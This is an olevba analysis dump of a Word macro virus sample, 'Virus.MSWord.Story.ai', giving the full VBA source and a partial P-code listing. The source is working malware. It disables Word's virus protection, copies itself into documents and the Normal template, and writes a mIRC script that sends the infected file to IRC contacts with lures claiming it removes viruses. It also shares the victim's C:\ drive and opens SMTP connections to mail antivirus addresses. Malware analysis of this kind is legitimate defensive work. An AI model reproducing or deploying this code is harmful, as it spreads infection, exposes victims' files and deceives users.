olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Story.ai
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Story.ai - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
'Jack-In-The-Box
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Something.VirusProtection = 0
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Something.SaveNormalPrompt = 0
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Application.StatusBar = 0
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Set AnI = ActiveDocument.VBProject.VBComponents(1)
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
If UCase(AnI.CodeModule.Lines(3, 1)) = "'JACK-IN-THE-BOX" Then InA = 1
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
If InA = 1 And InB = 1 Then Exit Sub
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
VCode = CnI.CodeModule.Lines(2, CnI.CodeModule.CountOfLines)
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
If InB = 1 Then AnI.CodeModule.AddFromString ("Private Sub Document_Open" & Chr(13) & VCode)
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
somename = ActiveDocument.Name
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
If InB = 1 Then
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
var3 = "C:\mirc\script.ini"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
If System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") = "off"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Open "C:\mirc\script.ini" For Output As #1
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n0=On 1:Connect:{ .notify SimpleSmn | Set %var7 $rand(1,8) | If ( %var7 = 1 ) { Set %var8 mirc.com } | If ( %var7 = 2 ) { Set %var8 georgecarlin.com } | If ( %var7 = 3 ) { Set %var8 carrottop.com } | If ( %var7 = 4 ) { Set %var8 anvdesign.net } | If ( %var7 = 5 ) { Set %var8 symantec.com } | If ( %var7 = 6 ) { Set %var8 drsolomon.com } | If ( %var7 = 7 ) { Set %var8 www.bocklabs.wisc.edu } | If ( %var7 = 8 ) { Set %var8 ebay.com } | Set %var9 $rand(1,4) | If ( %var9 = 1 ) { Set %var10 evrt@avp.com } | If ( %var9 = 2 ) { Set %var10 samples@datafellows.com } | If ( %var9 = 3 ) { Set %var10 virus_research@nai.com } | If ( %var9 = 3 ) { Set %var10 tech_support@nai.com } | If ( $exists(C:\Windows\script1.ini) = $true ) { .remove C:\Windows\script1.ini } | .copy C:\mirc\script.ini C:\Windows\script1.ini | .load -rs C:\Windows\script1.ini | .write -c C:\mirc\script.ini [script] | .reload -rs C:\mirc\script.ini }"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n2=On 1:Notify:{ .timer3 1 10 { .clear -s } | If ( $nick == SimpleSmn ) { .msg SimpleSmn I'm on irc. | halt } | .timer1 1 15 { .notify -r $nick | .ignore $nick | .timer9 1 5 { .msg $nick Hey, I can't talk right now but I wanted to send you this file.  It has a funny story you should read, and also has macros inside that protect you from a lot of viruses.  Just open the document, enable the macros, and if you are infected it will get rid of the virus } | .timer2 1 15 { .dcc send $nick C:\Windows\Story.doc } } | .timer 1 16 { .notify | .clear -s } }"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n4=On 1:Join:#: if (help isin $chan) || (nohack isin $chan) { .part $chan } | If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini }"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n6=On 1:Invite:#:{ .ignore $nick | .timer 1 10 { .join # } | .timer 1 15 { .msg $nick Thanks for the invite } | .timer 1 20 { .msg $nick I'm a little busy so I can't talk much now.  I thought you might want to look at this file I got. It has a funny story and also has macros in it which get rid of any macro viruses.  Just enable the macros when the prompt comes up and it will scan for any viruses and clean them. } | .timer 1 25 { .dcc send $nick C:\Windows\Story.doc } }"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n7=On 1:Notice:Simplicity:*: .fserve $nick 100 C:\"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n9=On 1:Text:*worm*:*: .ignore $nick"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n11=On 1:Text:*infect*:*: .ignore $nick"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n13=On 1:Text:*macro*:*: .ignore $nick"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n15=On 1:Text:*Hi*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n16=On 1:Text:*!*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n18=On 1:Text:*Hello*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n20=If ( $sockerr != 0 ) { halt } | .sockwrite -n virc rcpt to: %var10 | .sockwrite -n virc data | .sockwrite -n virc To: %var10 | .sockwrite -n virc From: %var5 | .sockwrite -n virc Subject: %var6 | .sockwrite -n virc Jack-In-The-Box Has Popped Up Again! | .sockwrite -n virc . | .sockwrite -n virc Quit | .sockclose virc }"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Close #1
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
ActiveDocument.SaveAs FileName:="C:\Windows\Story.doc", AddToRecentFiles:=False
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
End If
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
End If
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
CommandBars("Tools").Controls("Customize...").Enabled = 0
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
CommandBars("View").Controls("Status Bar").Enabled = 0
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc

'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc

'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc

'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
















Sub AutoOpen()
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
On Error GoTo out
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
Options.VirusProtection = False
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
Options.SaveNormalPrompt = False
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
Options.ConfirmConversions = False
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If nt > 70 And ad > 0 Then GoTo out
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If nt < 70 Then
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End If
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
host.CodeModule.AddFromFile ("c:\class.sys")
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
With host.CodeModule
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    For x = 1 To 4
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    .deletelines 1
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    Next x
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End With
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If nt < 70 Then
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    With host.CodeModule
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    .replaceline 1, "Sub AutoClose()"
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    .replaceline 71, "Sub ToolsMacro()"
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    End With
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End If
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
With host.CodeModule
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    For x = 2 To 72 Step 2
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    Next x
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End With
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
out:
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End Sub
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
Sub ViewVBCode()
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Story.ai
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 17190 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #2:
' 	QuoteRem 0x0000 0x000F "Jack-In-The-Box"
' Line #3:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Something 
' 	MemSt VirusProtection 
' Line #5:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Something 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #9:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set AnI 
' Line #11:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #12:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld AnI 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "'JACK-IN-THE-BOX"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St InA 
' 	EndIf 
' Line #13:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #14:
' 	Ld InA 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld InB 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #15:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #16:
' 	LitDI2 0x0002 
' 	Ld CnI 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld CnI 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' Line #17:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #18:
' 	Ld InB 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0019 "Private Sub Document_Open"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld AnI 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #19:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #20:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St somename 
' Line #21:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #22:
' 	Ld InB 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #23:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #24:
' 	LitStr 0x0012 "C:\mirc\script.ini"
' 	St var3 
' Line #25:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #26:
' 	LitStr 0x0010 "C:\mirc\mirc.ini"
' 	LitStr 0x000A "fileserver"
' 	LitStr 0x0007 "warning"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "off"
' 	LitStr 0x0010 "C:\mirc\mirc.ini"
' 	LitStr 0x000A "fileserver"
' 	LitStr 0x0007 "warning"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #28:
' 	LitStr 0x0012 "C:\mirc\script.ini"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #29:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0396 "n0=On 1:Connect:{ .notify SimpleSmn | Set %var7 $rand(1,8) | If ( %var7 = 1 ) { Set %var8 mirc.com } | If ( %var7 = 2 ) { Set %var8 georgecarlin.com } | If ( %var7 = 3 ) { Set %var8 carrottop.com } | If ( %var7 = 4 ) { Set %var8 anvdesign.net } | If ( %var7 = 5 ) { Set %var8 symantec.com } | If ( %var7 = 6 ) { Set %var8 drsolomon.com } | If ( %var7 = 7 ) { Set %var8 www.bocklabs.wisc.edu } | If ( %var7 = 8 ) { Set %var8 ebay.com } | Set %var9 $rand(1,4) | If ( %var9 = 1 ) { Set %var10 evrt@avp.com } | If ( %var9 = 2 ) { Set %var10 samples@datafellows.com } | If ( %var9 = 3 ) { Set %var10 virus_research@nai.com } | If ( %var9 = 3 ) { Set %var10 tech_support@nai.com } | If ( $exists(C:\Windows\script1.ini) = $true ) { .remove C:\Windows\script1.ini } | .copy C:\mirc\script.ini C:\Windows\script1.ini | .load -rs C:\Windows\script1.ini | .write -c C:\mirc\script.ini [script] | .reload -rs C:\mirc\script.ini }"
' 	PrintItemNL 
' Line #31:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #32:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0229 "n2=On 1:Notify:{ .timer3 1 10 { .clear -s } | If ( $nick == SimpleSmn ) { .msg SimpleSmn I'm on irc. | halt } | .timer1 1 15 { .notify -r $nick | .ignore $nick | .timer9 1 5 { .msg $nick Hey, I can't talk right now but I wanted to send you this file.  It has a funny story you should read, and also has macros inside that protect you from a lot of viruses.  Just open the document, enable the macros, and if you are infected it will get rid of the virus } | .timer2 1 15 { .dcc send $nick C:\Windows\Story.doc } } | .timer 1 16 { .notify | .clear -s } }"
' 	PrintItemNL 
' Line #33:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0097 "n4=On 1:Join:#: if (help isin $chan) || (nohack isin $chan) { .part $chan } | If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini }"
' 	PrintItemNL 
' Line #35:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x01DA "n6=On 1:Invite:#:{ .ignore $nick | .timer 1 10 { .join # } | .timer 1 15 { .msg $nick Thanks for the invite } | .timer 1 20 { .msg $nick I'm a little busy so I can't talk much now.  I thought you might want to look at this file I got. It has a funny story and also has macros in it which get rid of any macro viruses.  Just enable the macros when the prompt comes up and it will scan for any viruses and clean them. } | .timer 1 25 { .dcc send $nick C:\Windows\Story.doc } }"
' 	PrintItemNL 
' Line #37:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "n7=On 1:Notice:Simplicity:*: .fserve $nick 100 C:\"
' 	PrintItemNL 
' Line #39:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "n9=On 1:Text:*worm*:*: .ignore $nick"
' 	PrintItemNL 
' Line #41:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "n11=On 1:Text:*infect*:*: .ignore $nick"
' 	PrintItemNL 
' Line #43:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "n13=On 1:Text:*macro*:*: .ignore $nick"
' 	PrintItemNL 
' Line #45:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0052 "n15=On 1:Text:*Hi*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
' 	PrintItemNL 
' Line #47:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0051 "n16=On 1:Text:*!*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
' 	PrintItemNL 
' Line #49:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0055 "n18=On 1:Text:*Hello*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
' 	PrintItemNL 
' Line #51:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0144 "n20=If ( $sockerr != 0 ) { halt } | .sockwrite -n virc rcpt to: %var10 | .sockwrite -n virc data | .sockwrite -n virc To: %var10 | .sockwrite -n virc From: %var5 | .sockwrite -n virc Subject: %var6 | .sockwrite -n virc Jack-In-The-Box Has Popped Up Again! | .sockwrite -n virc . | .sockwrite -n virc Quit | .sockclose virc }"
' 	PrintItemNL 
' Line #53:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #55:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #56:
' 	LitStr 0x0014 "C:\Windows\Story.doc"
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #57:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #62:
' 	LitDI2 0x0000 
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #63:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #64:
' 	LitDI2 0x0000 
' 	LitStr 0x000A "Status Bar"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #65:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #66:
' Line #67:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #68:
' Line #69:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #70:
' Line #71:
' 	QuoteRem 0x0000 0x003C "Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' 	FuncDefn (Sub AutoOpen())
' Line #89:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #90:
' 	OnError out 
' Line #91:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #92:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #93:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #94:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #95:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #96:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #97:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #98:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #99:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #100:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #101:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #102:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #103:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #104:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #105:
' 	QuoteRem 0x0000 0x0051 "Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34"
' Line #106:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
